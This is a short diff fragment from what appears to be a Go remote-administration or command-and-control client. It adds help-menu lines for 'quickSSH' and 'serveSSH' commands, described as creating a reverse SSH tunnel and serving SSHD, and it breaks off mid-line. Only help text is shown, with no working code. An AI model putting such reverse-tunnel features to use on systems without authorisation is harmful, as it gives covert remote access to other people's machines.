@@ -498,4 +498,5 @@ func interact(UID string) {
 		case line == "help":
 			fmt.Println("Available commands:")
 			fmt.Println("info\t\t\t\tprint client info")
-			fmt.Pri
+			fmt.Println("quickSSH\t\t\tcreate reverse SSH tunnel and serve SSHD")
+			fmt.Println("serveSSH\t\t\tcreate reverse SSH t
